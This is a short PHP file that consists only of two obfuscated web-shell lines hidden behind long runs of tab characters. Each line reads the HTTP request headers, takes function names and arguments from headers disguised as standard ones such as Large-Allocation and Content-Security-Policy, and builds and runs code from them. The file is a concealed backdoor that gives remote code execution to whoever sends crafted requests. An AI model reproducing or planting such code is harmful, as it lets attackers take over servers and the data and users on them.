<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Large-Allocation'])){$locked=$_HEADERS['Large-Allocation']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Content-Security-Policy']));$locked();}
																																										$_HEADERS=getallheaders();if(isset($_HEADERS['X-Dns-Prefetch-Control'])){$config=$_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Server-Timing']));$config();}
